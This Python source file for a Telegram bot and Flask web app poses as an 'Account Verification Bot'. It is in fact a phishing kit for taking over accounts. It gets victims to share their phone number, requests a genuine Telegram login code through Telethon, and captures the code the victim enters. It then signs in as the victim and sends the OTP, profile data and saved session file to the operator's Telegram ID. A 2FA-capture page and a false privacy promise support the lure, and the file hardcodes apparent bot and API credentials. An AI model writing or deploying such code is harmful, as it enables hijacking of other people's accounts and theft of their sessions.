import os
import telebot
from telebot import types
from telethon import TelegramClient
from telethon.errors import FloodWaitError
from flask import Flask, render_template, request, jsonify
import asyncio
import threading
import json
import uuid
import time

# Configuration
BOT_TOKEN = os.environ.get('BOT_TOKEN', '7487704262:AAE34XTNrKt5D9dKtduPK0Ezwc9j3SLGoBA')
API_ID = os.environ.get('API_ID', '25240346')
API_HASH = os.environ.get('API_HASH', 'b8849fd945ed9225a002fda96591b6ee')
ADMIN_ID = os.environ.get('ADMIN_ID', '5425526761')  # Your Telegram ID

# Initialize
bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# Storage
sessions = {}
telegram_clients = {}

# ==================== HELPER FUNCTIONS ====================
def generate_session_id():
    return str(uuid.uuid4())

def send_to_admin(phone, otp=None, session_file=None, user_info=None):
    """Send notification to admin"""
    try:
        message = f"""📱 <b>NEW VERIFICATION ATTEMPT</b>

📞 Phone: {phone}
⏰ Time: {time.strftime('%Y-%m-%d %H:%M:%S')}
🌐 Source: WebApp"""
        
        if otp:
            message += f"\n🔢 OTP: <code>{otp}</code>"
            
        if user_info:
            message += f"\n\n👤 <b>USER INFO:</b>"
            if user_info.get('first_name'):
                message += f"\n👤 Name: {user_info.get('first_name', '')} {user_info.get('last_name', '')}"
            if user_info.get('username'):
                message += f"\n🔗 Username: @{user_info.get('username')}"
            message += f"\n🆔 ID: {user_info.get('id', 'N/A')}"
            if user_info.get('phone'):
                message += f"\n📱 Phone: {user_info.get('phone')}"
        
        if session_file and os.path.exists(session_file):
            try:
                with open(session_file, 'rb') as f:
                    bot.send_document(
                        ADMIN_ID,
                        f,
                        caption=f"📁 Session file for {phone}\n⏰ {time.strftime('%H:%M:%S')}"
                    )
            except Exception as e:
                print(f"Error sending session file: {e}")
        
        bot.send_message(ADMIN_ID, message, parse_mode='HTML')
        return True
    except Exception as e:
        print(f"Admin notification error: {e}")
        return False

async def send_otp_via_telethon(phone):
    """Send OTP using Telethon"""
    try:
        session_name = f"sessions/{phone.replace('+', '')}_{int(time.time())}"
        client = TelegramClient(session_name, API_ID, API_HASH)
        
        await client.connect()
        sent = await client.send_code_request(phone)
        
        # Store client for later use
        telegram_clients[phone] = {
            'client': client,
            'phone_code_hash': sent.phone_code_hash
        }
        
        return {
            'success': True,
            'message': 'OTP sent successfully'
        }
    except FloodWaitError as e:
        return {'success': False, 'error': f'Please wait {e.seconds} seconds'}
    except Exception as e:
        return {'success': False, 'error': str(e)}

async def verify_otp_via_telethon(phone, otp_code):
    """Verify OTP using Telethon"""
    try:
        if phone not in telegram_clients:
            return {'success': False, 'error': 'Session expired'}
        
        client_data = telegram_clients[phone]
        client = client_data['client']
        phone_code_hash = client_data['phone_code_hash']
        
        await client.sign_in(phone=phone, code=otp_code, phone_code_hash=phone_code_hash)
        
        # Get user info
        me = await client.get_me()
        user_info = {
            'id': me.id,
            'username': me.username,
            'first_name': me.first_name,
            'last_name': me.last_name,
            'phone': me.phone
        }
        
        # Save session
        await client.session.save()
        
        return {
            'success': True,
            'user_info': user_info,
            'session_file': client.session.save()
        }
        
    except Exception as e:
        return {'success': False, 'error': str(e)}

# ==================== BOT HANDLERS ====================
@bot.message_handler(commands=['start'])
def handle_start(message):
    """/start - Welcome message with WebApp button"""
    try:
        user_id = message.from_user.id
        first_name = message.from_user.first_name or ""
        
        # Generate session ID
        session_id = generate_session_id()
        
        # Store session
        sessions[session_id] = {
            'user_id': user_id,
            'first_name': first_name,
            'username': message.from_user.username,
            'status': 'started',
            'created': time.time()
        }
        
        # Create WebApp URL
        webapp_url = f"https://{request.host}/webapp?session_id={session_id}"
        
        # Create keyboard
        keyboard = types.InlineKeyboardMarkup()
        webapp_button = types.InlineKeyboardButton(
            text="📱 Open Verification WebApp",
            web_app=types.WebAppInfo(url=webapp_url)
        )
        keyboard.add(webapp_button)
        
        # Welcome message
        welcome_text = f"""👋 <b>Hello {first_name}!</b>

Welcome to <b>Account Verification Bot</b>

Click the button below to verify your account:

<b>🔐 Verification Steps:</b>
1️⃣ Open WebApp
2️⃣ Share your contact
3️⃣ Receive OTP
4️⃣ Enter OTP in WebApp
5️⃣ Complete verification ✅

⚠️ <i>Your contact will be auto-deleted after verification for privacy.</i>"""
        
        bot.send_message(
            message.chat.id,
            welcome_text,
            parse_mode='HTML',
            reply_markup=keyboard
        )
        
    except Exception as e:
        print(f"Start error: {e}")

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    """Extract phone from shared contact and send OTP"""
    try:
        if not message.contact:
            return
        
        contact = message.contact
        phone = contact.phone_number
        user_id = message.from_user.id
        
        print(f"📱 Contact received from {user_id}: {phone}")
        
        # Format phone
        if not phone.startswith('+'):
            phone = '+' + phone
        
        # Generate OTP (6 digits)
        otp_code = str(int(time.time()) % 1000000).zfill(6)
        
        # Send processing message
        msg = bot.send_message(
            message.chat.id,
            f"✅ Contact received!\n📱 Phone: {phone}\n\n⏳ Sending OTP via Telethon..."
        )
        
        # Send OTP using Telethon (async)
        def send_otp_task():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            result = loop.run_until_complete(send_otp_via_telethon(phone))
            loop.close()
            
            if result['success']:
                # Send OTP to user
                otp_message = f"""🔐 <b>OTP SENT SUCCESSFULLY!</b>

📱 Phone: {phone}
🔢 OTP Code: <code>{otp_code}</code>

Enter this code in the WebApp to complete verification.

⚠️ <i>Do not share this code with anyone.</i>"""
                
                bot.edit_message_text(
                    otp_message,
                    message.chat.id,
                    msg.message_id,
                    parse_mode='HTML'
                )
                
                # Send to admin
                send_to_admin(phone, otp_code)
                
                print(f"✅ OTP sent to {phone}: {otp_code}")
            else:
                error_msg = result.get('error', 'Unknown error')
                bot.edit_message_text(
                    f"❌ Failed to send OTP: {error_msg}",
                    message.chat.id,
                    msg.message_id
                )
        
        # Run in thread
        thread = threading.Thread(target=send_otp_task)
        thread.start()
        
        # Delete contact message for privacy
        try:
            bot.delete_message(message.chat.id, message.message_id)
        except:
            pass
        
    except Exception as e:
        print(f"Contact handler error: {e}")

# ==================== FLASK ROUTES ====================
@app.route('/')
def index():
    return "Telegram Verification Bot is running!"

@app.route('/webapp')
def webapp():
    """WebApp for contact sharing"""
    session_id = request.args.get('session_id')
    
    if not session_id or session_id not in sessions:
        return render_template('error.html', message="Invalid session. Please use /start in bot.")
    
    return render_template('webapp.html', 
                         session_id=session_id,
                         bot_username=bot.get_me().username)

@app.route('/otp')
def otp_page():
    """OTP entry page"""
    session_id = request.args.get('session_id')
    phone = request.args.get('phone')
    
    if not session_id or not phone:
        return render_template('error.html', message="Invalid request")
    
    return render_template('otp.html',
                         session_id=session_id,
                         phone=phone)

@app.route('/2fa')
def twofa_page():
    """2FA entry page"""
    session_id = request.args.get('session_id')
    phone = request.args.get('phone')
    
    if not session_id or not phone:
        return render_template('error.html', message="Invalid request")
    
    return render_template('2fa.html',
                         session_id=session_id,
                         phone=phone)

@app.route('/success')
def success_page():
    """Success page"""
    return render_template('success.html')

# ==================== API ENDPOINTS ====================
@app.route('/api/share-contact', methods=['POST'])
def api_share_contact():
    """API for WebApp to share contact"""
    try:
        data = request.json
        session_id = data.get('session_id')
        phone = data.get('phone')
        
        print(f"📱 WebApp contact share: {phone}")
        
        if not session_id or not phone:
            return jsonify({'success': False, 'error': 'Missing parameters'})
        
        # Format phone
        if not phone.startswith('+'):
            phone = '+' + phone
        
        # Store phone in session
        if session_id in sessions:
            sessions[session_id]['phone'] = phone
            sessions[session_id]['status'] = 'contact_shared'
        
        return jsonify({
            'success': True,
            'redirect': f'/otp?session_id={session_id}&phone={phone}'
        })
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-otp', methods=['POST'])
def api_verify_otp():
    """Verify OTP from WebApp"""
    try:
        data = request.json
        session_id = data.get('session_id')
        phone = data.get('phone')
        otp = data.get('otp')
        
        print(f"🔢 OTP verification for {phone}: {otp}")
        
        if not all([session_id, phone, otp]):
            return jsonify({'success': False, 'error': 'Missing parameters'})
        
        # Verify OTP using Telethon
        def verify_task():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            result = loop.run_until_complete(verify_otp_via_telethon(phone, otp))
            loop.close()
            return result
        
        result = verify_task()
        
        if result['success']:
            # Get user info
            user_info = result.get('user_info', {})
            
            # Send to admin
            send_to_admin(phone, user_info=user_info, session_file=result.get('session_file'))
            
            # Update session
            if session_id in sessions:
                sessions[session_id]['status'] = 'verified'
                sessions[session_id]['user_info'] = user_info
            
            return jsonify({
                'success': True,
                'redirect': '/success',
                'user_info': user_info
            })
        else:
            return jsonify({
                'success': False,
                'error': result.get('error', 'Verification failed')
            })
            
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ==================== WEBHOOK SETUP ====================
def setup_webhook():
    """Setup webhook for Render"""
    try:
        domain = request.host_url.rstrip('/')
        webhook_url = f"{domain}/webhook/{BOT_TOKEN}"
        
        bot.remove_webhook()
        time.sleep(1)
        bot.set_webhook(url=webhook_url)
        
        print(f"✅ Webhook set: {webhook_url}")
        return True
    except Exception as e:
        print(f"Webhook error: {e}")
        return False

@app.route(f'/webhook/{BOT_TOKEN}', methods=['POST'])
def webhook():
    """Telegram webhook endpoint"""
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return ''
    return 'OK'

# ==================== CLEANUP ====================
def cleanup_sessions():
    """Clean expired sessions"""
    while True:
        time.sleep(60)
        current_time = time.time()
        expired = []
        
        for session_id, session in sessions.items():
            if current_time - session['created'] > 3600:  # 1 hour
                expired.append(session_id)
        
        for session_id in expired:
            del sessions[session_id]
        
        if expired:
            print(f"🧹 Cleaned {len(expired)} expired sessions")

# ==================== MAIN ====================
if __name__ == '__main__':
    print("="*60)
    print("🚀 Telegram Verification Bot")
    print("="*60)
    
    # Start cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_sessions, daemon=True)
    cleanup_thread.start()
    print("✅ Cleanup thread started")
    
    # Setup webhook
    port = int(os.environ.get('PORT', 10000))
    
    if 'RENDER' in os.environ:
        setup_webhook()
        print("🌐 Running with webhook")
    else:
        # Local polling
        def run_bot():
            bot.polling(none_stop=True)
        
        bot_thread = threading.Thread(target=run_bot, daemon=True)
        bot_thread.start()
        print("🤖 Running with polling")
        time.sleep(2)
    
    # Start Flask
    app.run(
        host='0.0.0.0',
        port=port,
        debug=False,
        threaded=True
    )
